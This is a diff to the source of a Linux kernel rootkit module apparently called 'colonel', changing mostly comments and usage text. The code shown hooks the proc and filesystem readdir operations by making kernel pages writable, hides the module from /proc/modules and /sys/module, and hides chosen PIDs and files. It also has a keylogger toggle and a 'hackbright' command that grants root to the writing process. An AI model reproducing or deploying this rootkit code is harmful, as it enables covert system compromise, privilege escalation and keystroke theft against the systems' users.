@@ -31,8 +31,8 @@ static filldir_t og_fs_filldir;
 static struct file_operations *proc_fops;
 static struct file_operations *fs_fops;
 
-/* pointer to the module entry that is above the rootkit in main module/kobject list -- 
- * acts as a placeholder for where to place the rootkit entry when shown*/
+/* pointer to the module entry that is above the rootkit in /proc/modules (modules list) 
+ * and /sys/module (kobject) -- acts as a placeholder for where to place the rootkit entry when shown*/
 static struct list_head *prev_module;
 static struct list_head *prev_kobj_module;
 
@@ -45,7 +45,7 @@ static char key_logger = 0;
 static char hidden_files = 1;
 static char hidden_module = 0;
 
-/* module status array -- provides a method of printing */
+/* module status array -- stores info to be printed to /proc/colonel */
 static char module_status[1024];
 
 /* MODULE FUNCTIONS */
@@ -80,6 +80,7 @@ void show_module(void) {
 }
 
 /* PAGE READ/WRITE FUNCTIONS */ 
+/* Allows the modification of memory page attributes. This will enable the passing of modified functions. */
 static void set_addr_rw(void *addr) {
 	unsigned int level;
 	pte_t *pte = lookup_address((unsigned long) addr, &level);						/* get what page the address is on */
@@ -142,9 +143,9 @@ USAGE:\n\
   From command line --\n\
   $ echo -n <command> >> /proc/colonel\n\n\
   From colcmd --\n\
-  $ ./rtcmd.py hp1337\n\n\
+  $ ./rtcmd <command>\n\n\
   To get root access --\n\
-  $ ./rtcmd.py hackbright /bin/bash\n\n\
+  $ ./rtcmd hackbright /bin/bash\n\n\
 COMMANDS:\n\
   hackbright - uid and gid 0 for writing process\n\
   tls - toggles keylogger listening on/off\n\
@@ -209,7 +210,7 @@ static int write_colonel(struct file *file, const char __user *buff, unsigned lo
 		show_module();
 	}
 	
-    return count;
+	return count;
 }
 
 
@@ -231,7 +232,7 @@ static void clean_procfs(void) {
 static void clean_fs(void) {
 	if (fs_fops != NULL && og_fs_readdir != NULL) {
 		set_addr_rw(fs_fops);
-		fs_fops->readdir = og_fs_readdir;								/* restore original fs readdir */
+		fs_fops->readdir = og_fs_readdir;								/* restore original fs_readdir */
 		set_addr_ro(fs_fops);
 	}
 }
@@ -250,11 +251,10 @@ static int __init procfs_init(void) {
 	proc_colonel->read_proc = read_colonel;									/* sets custom read function */
 	proc_colonel->write_proc = write_colonel;								/* sets custom write function */
 	
-	/* (using page mode change) */
 	proc_fops = ((struct file_operations *) proc_root->proc_fops);
 	og_proc_readdir = proc_fops->readdir;
 	set_addr_rw(proc_fops);
-	proc_fops->readdir = new_proc_readdir;									/* passes custom readdir */
+	proc_fops->readdir = new_proc_readdir;									/* passes custom readdir -- hides module and PIDs */
 	set_addr_ro(proc_fops);
 	
 	return 1;
@@ -272,7 +272,7 @@ static int __init fs_init(void) {
 	
 	og_fs_readdir = fs_fops->readdir;
 	set_addr_rw(fs_fops);
-	fs_fops->readdir = new_fs_readdir;									/* passes custom readdir */ 
+	fs_fops->readdir = new_fs_readdir;									/* passes custom readdir -- hides files with specified prefixes */ 
 	set_addr_ro(fs_fops);
 	
 	return 1;
